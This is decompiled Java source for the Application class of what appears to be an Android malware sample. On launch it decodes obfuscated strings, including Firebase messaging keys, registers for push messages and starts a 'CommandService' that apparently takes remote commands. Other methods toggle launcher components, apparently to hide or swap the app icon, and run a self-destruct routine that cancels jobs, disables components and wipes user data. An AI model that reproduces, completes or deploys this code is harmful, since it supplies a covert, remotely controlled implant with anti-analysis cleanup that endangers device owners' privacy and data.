package com.base.template;

import android.app.ActivityManager;
import android.app.Application;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import androidx.work.JobListenableFuture;
import androidx.work.SystemClock;
import androidx.work.impl.Processor$$ExternalSyntheticLambda2;
import androidx.work.impl.WorkDatabase;
import androidx.work.impl.WorkManagerImpl;
import androidx.work.impl.model.Preference;
import androidx.work.impl.utils.CancelWorkRunnable;
import com.base.template.services.CommandService;
import com.base.template.services.CrashHandler;
import com.google.android.datatransport.cct.CctTransportBackend$$ExternalSyntheticLambda0;
import com.google.android.gms.common.internal.zzag;
import com.google.android.gms.tasks.TaskCompletionSource;
import com.google.android.gms.tasks.TaskExecutors;
import com.google.android.gms.tasks.zzw;
import com.google.firebase.FirebaseApp;
import com.google.firebase.FirebaseOptions;
import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.messaging.Store;
import java.util.ArrayList;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class App extends Application {
    private static volatile Context appContext;
    private static final String FCM_API_KEY = C0000.decode(new byte[]{116, 42, 75, 89, 49, 24, 116, 1, 72, 92, 42, 53, 126, 58, 80, 107, 10, 57, 71, 9, 99, 13, 61, 50, 97, 11, 4, 121, 40, 54, 92, 48, 110, 86, 48, 88, 124, 80, 66}, "5c18ba", 0.0f);
    private static final String FCM_APP_ID = C0000.decode(new byte[]{84, 13, 86, 15, 82, 3, 8, 81, 5, 82, 87, 7, 85, 2, 5, 95, 92, 22, 95, 8, 1, 13, 80, 89, 2, 6, 11, 6, 9, 7, 6, 3, 86, 93, 83, 5, 11, 81, 6, 4, 1, 1, 4, 10}, "e7b8d18d0a", 0.0f);
    private static final String FCM_PROJECT_ID = C0000.decode(new byte[]{89, 70, 71, 27, 21, 23, 23, 94, 21, 69, 82, 68, 19, 11, 7, 83, 21, 85, 86, 15, 87, 82}, "8676ebd6", true);
    private static final String FCM_SENDER_ID = C0000.decode(new byte[]{86, 1, 83, 84, 8, 81, 86, 4, 10, 86, 85}, "b6ef8dc78f", 7);
    private static final String TAG = C0000.decode(new byte[]{119, 20, 66}, "6d26ff62fdc4", 3);
    public static final Companion Companion = new Companion();

    public final class Companion {
    }

    public static final void a1() {
        Companion companion = Companion;
        companion.getClass();
        Context context = appContext;
        if (context != null) {
            companion.getClass();
            try {
                PackageManager packageManager = context.getPackageManager();
                String packageName = context.getPackageName();
                packageManager.setComponentEnabledSetting(new ComponentName(packageName, packageName + C0000.decode(new byte[]{31, 44, 90, 80, 83, 84, 87, 35, 93, 13, 82, 71}, "1d34719b", 0.0f)), 1, 1);
                Thread.sleep(500L);
                packageManager.setComponentEnabledSetting(new ComponentName(packageName, packageName + C0000.decode(new byte[]{22, 51, 10, 66, 93, 90, 91, 1, 121, 9, 10, 80, 71}, "8ec1487d")), 2, 1);
            } catch (Exception unused) {
            }
        }
    }

    public static final void a2() {
        Companion companion = Companion;
        companion.getClass();
        Context context = appContext;
        if (context != null) {
            companion.getClass();
            try {
                PackageManager packageManager = context.getPackageManager();
                String packageName = context.getPackageName();
                packageManager.setComponentEnabledSetting(new ComponentName(packageName, packageName + C0000.decode(new byte[]{25, 111, 12, 69, 81, 0, 91, 92, 36, 90, 81, 3, 68}, "79e68b")), 1, 1);
                Thread.sleep(500L);
                packageManager.setComponentEnabledSetting(new ComponentName(packageName, packageName + C0000.decode(new byte[]{22, 124, 8, 80, 1, 86, 86, 119, 90, 80, 0, 70}, "84a4e38669a5c4e2", true)), 2, 1);
            } catch (Exception unused) {
            }
        }
    }

    public static final void a3() {
        Companion.getClass();
        Context context = appContext;
        if (context == null) {
            return;
        }
        try {
            final WorkManagerImpl instance$1 = WorkManagerImpl.getInstance$1(context);
            instance$1.mWorkTaskExecutor.executeOnTaskThread(new CancelWorkRunnable() { // from class: androidx.work.impl.utils.CancelWorkRunnable.4
                public AnonymousClass4() {
                }

                @Override // androidx.work.impl.utils.CancelWorkRunnable
                public final void runInternal() {
                    WorkManagerImpl workManagerImpl = workManagerImpl;
                    WorkDatabase workDatabase = workManagerImpl.mWorkDatabase;
                    workDatabase.beginTransaction();
                    try {
                        ArrayList allUnfinishedWork = workDatabase.workSpecDao().getAllUnfinishedWork();
                        int size = allUnfinishedWork.size();
                        int i = 0;
                        while (i < size) {
                            Object obj = allUnfinishedWork.get(i);
                            i++;
                            CancelWorkRunnable.cancel(workManagerImpl, (String) obj);
                        }
                        ((SystemClock) workManagerImpl.mConfiguration.clock).getClass();
                        workDatabase.preferenceDao().insertPreference(new Preference(C0000.decode(new byte[]{93, 83, 75, 71, 59, 85, 89, 93, 0, 92, 14, 57, 80, 94, 84, 108, 16, 95, 85, 86, 60, 84, 17}, "1283d683c9bf", 2), Long.valueOf(System.currentTimeMillis())));
                        workDatabase.setTransactionSuccessful();
                    } finally {
                        workDatabase.internalEndTransaction();
                    }
                }
            });
        } catch (Exception unused) {
        }
        try {
            PackageManager packageManager = context.getPackageManager();
            String packageName = context.getPackageName();
            String[] strArr = {packageName + C0000.decode(new byte[]{74, 55, 94, 71, 91, 84, 88, 82, 115, 10, 13, 2, 75}, "da7426472fdc8bc7"), packageName + C0000.decode(new byte[]{29, 113, 8, 85, 86, 93, 10, 39, 95, 80, 0, 66}, "39a128df", 6), packageName + C0000.decode(new byte[]{29, 23, 80, 66, 21, 93, 1, 84, 64, 74, 118, 95, 14, 89, 3, 95, 87, 55, 80, 66, 21, 93, 1, 84}, "3d50c4b1", 0.0f), packageName + C0000.decode(new byte[]{23, 21, 82, 70, 66, 12, 1, 86, 66, 75, 126, 16, 2, 23, 87, 88, 88, 8, 100, 81, 70, 19, 11, 80, 84}, "9f744eb31e9ece31"), packageName + C0000.decode(new byte[]{27, 45, 10, 76, 15, 84, 40, 89, 69, 68, 84, 12, 0, 64}, "5ce8f2d0601be2"), packageName + C0000.decode(new byte[]{31, 49, 11, 75, 113, 0, 89, 11, 71, 7, 20, 106, 80, 6, 80, 11, 71, 7, 20}, "1bf85e5b", 4)};
            for (int i = 0; i < 6; i++) {
                try {
                    packageManager.setComponentEnabledSetting(new ComponentName(packageName, strArr[i]), 2, 1);
                } catch (Exception unused2) {
                }
            }
        } catch (Exception unused3) {
        }
        try {
            if ((context instanceof Application ? (Application) context : null) != null) {
                Object systemService = context.getSystemService(C0000.decode(new byte[]{3, 5, 68, 13, 16, 11, 70, 24}, "bf0dfb2a2529", 0.0f));
                ActivityManager activityManager = systemService instanceof ActivityManager ? (ActivityManager) systemService : null;
                if (activityManager != null) {
                    activityManager.clearApplicationUserData();
                }
            }
        } catch (Exception unused4) {
        }
    }

    private final void initFirebase() {
        FirebaseMessaging firebaseMessaging;
        try {
            if (FirebaseApp.getApps().isEmpty()) {
                String strDecode = C0000.decode(new byte[]{4, 13, 0, 4, 0, 0, 8, 83, 4, 87, 80, 1, 2, 13, 85, 93, 82, 64, 87, 15, 85, 94, 80, 80, 83, 0, 7, 81, 15, 84, 91, 82, 5, 1, 85, 5, 6, 2, 2, 86, 82, 4, 94, 84}, "5743628f1db1", false);
                zzag.checkNotEmpty(strDecode, C0000.decode(new byte[]{32, 18, 18, 90, 10, 2, 80, 18, 15, 11, 94, 43, 5, 66, 15, 67, 16, 21, 17, 4, 3, 68, 67, 7, 21, 76}, "abb6ca1ffd0b", 0.0f));
                String strDecode2 = C0000.decode(new byte[]{113, 113, 74, 2, 97, 78, 37, 90, 65, 93, 113, 101, 122, 110, 86, 101, 88, 96, 66, 9, 96, 2, 59, 107, 108, 81, 12, 112, 123, 96, 94, 101, 111, 86, 98, 90, 123, 4, 23}, "080c27d889911776", 0.0f);
                zzag.checkNotEmpty(strDecode2, C0000.decode(new byte[]{118, 69, 94, 120, 85, 78, 23, 88, 66, 64, 68, 23, 85, 80, 23, 64, 85, 67, 25}, "757307"));
                FirebaseApp.initializeApp(this, new FirebaseOptions(strDecode, strDecode2, null, null, C0000.decode(new byte[]{3, 14, 87, 2, 7, 87, 6, 4, 84, 4, 0}, "79a07b37f4", 0.0f), null, C0000.decode(new byte[]{4, 68, 22, 73, 66, 64, 66, 93, 72, 71, 3, 22, 68, 92, 82, 80, 72, 87, 7, 93, 0, 5}, "e4fd2515", false)));
            }
            Store store = FirebaseMessaging.store;
            synchronized (FirebaseMessaging.class) {
                firebaseMessaging = FirebaseMessaging.getInstance(FirebaseApp.getInstance());
            }
            firebaseMessaging.getClass();
            TaskCompletionSource taskCompletionSource = new TaskCompletionSource();
            firebaseMessaging.initExecutor.execute(new Processor$$ExternalSyntheticLambda2(firebaseMessaging, 17, taskCompletionSource));
            zzw zzwVar = taskCompletionSource.zza;
            CctTransportBackend$$ExternalSyntheticLambda0 cctTransportBackend$$ExternalSyntheticLambda0 = new CctTransportBackend$$ExternalSyntheticLambda0(2, new JobListenableFuture.AnonymousClass1(1, this));
            zzwVar.getClass();
            zzwVar.addOnSuccessListener(TaskExecutors.MAIN_THREAD, cctTransportBackend$$ExternalSyntheticLambda0);
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Application
    public void onCreate() {
        super.onCreate();
        appContext = getApplicationContext();
        Thread.setDefaultUncaughtExceptionHandler(new CrashHandler(getApplicationContext()));
        initFirebase();
        CommandService commandService = CommandService.instance;
        Headers.Companion.safeStartService(getApplicationContext(), C0000.decode(new byte[]{35, 99, 52, 104, 47, 45, 44, 102}, "b3d7fce2983b3f"));
    }
}
